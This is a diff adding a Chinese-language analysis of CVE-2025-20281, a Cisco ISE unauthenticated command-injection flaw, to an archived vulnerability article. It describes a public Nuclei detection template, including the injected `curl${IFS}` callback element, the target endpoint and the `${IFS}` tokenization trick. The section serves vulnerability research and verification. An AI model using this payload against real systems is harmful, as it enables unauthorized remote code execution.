@@ -154,3 +154,20 @@ se
 ---
 
 > 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
+
+
+## 2026-10-03 公开验证资料补充：ISE String[] 命令注入
+
+Cisco CNA 指向 ISE/ISE-PIC 3.3、3.4 的未认证 API。ZDI 的 Bobby Gould 原研究（2025-07-25）区分同端点的反序列化与命令注入，也解释了后续 CVE-2025-20337；本节只据实际载荷收录 20281 命令注入，不把同端点自动视为20337的独立利用证明。
+
+已全文静态阅读的 ProjectDiscovery 模板在本地按 Java 序列化格式构造两个元素的 String[]，首元素是 `x;curl${IFS}http://{{interactsh-url}}`，第二元素为空，POST 到 `/deployment-rpc/enableStrongSwanTunnel`。判据为对应 HTTP 回连，且目标响应 200、正文长度为2。十六进制头、长度拼装和尾部均在固定源文件可见，无下载执行型 helper。`${IFS}` 对应原研究说明的 Java 分词边界；普通空格版本在其试验中失败。
+
+原研究把初始执行限定在 privileged `strongswan-container`；宿主 root 还用了单独的容器逃逸，不能用这个简单回连模板证明宿主接管。修复与后续绕过应按 Cisco 当前分支/补丁矩阵，不沿用旧新闻把临时 hotpatch 与累计 patch 等同。此测试会执行命令并出网；未运行，研究图片未查看。
+
+独立复核补注：本次明确选定的完整触发材料是固定 Nuclei 模板，资格仅限其 String[] 命令注入与 HTTP 回连判据。ZDI HTML 技术正文已读；其中还嵌入 11 个 Gist，已取得并全文静态阅读前 8 个（Java 入口、脚本调用、失败对照、分词及容器 `/flag` 成功记录）。后 3 个宿主逃逸/结果 Gist 传输失败，请求截图返回 tunnel 403，因此不能声称 ZDI 原始技术资料整体读完，也不使用这些未取得材料证明宿主逃逸。部分 Gist 原文件名含 `CVE-2025-4919`；名称原值保留，编号对应依据 ZDI 正文及 Cisco CNA，不由文件名推断。未绕过 403，未访问任何示例目标。
+
+### 本补充的公开来源与读取范围
+
+- <https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/20xxx/CVE-2025-20281.json>（CNA字段摘读；ADP及其他字段不计全文；SHA-256 `039b4248546762b24538b056e5475f2e5c8f6f22603336dc4bacd521dce09d29`）
+- <https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/9e93c63782dbb2b6160e068710d6240f418a3ed6/http/cves/2025/CVE-2025-20281.yaml>（固定代码全文静态阅读；SHA-256 `ec9fc431eda2640876ce9536909dee42c8657837ad7a5f07961444cfa755d22d`）
+- <https://www.zerodayinitiative.com/blog/2025/7/24/cve-2025-20281-cisco-ise-api-unauthenticated-remote-code-execution-vulnerability>（研究技术正文阅读，图片范围单列；SHA-256 `edd9e2e3d50080c41023c9ada8bf753324354ec55e0e75f84d8ddd8a58769101`）
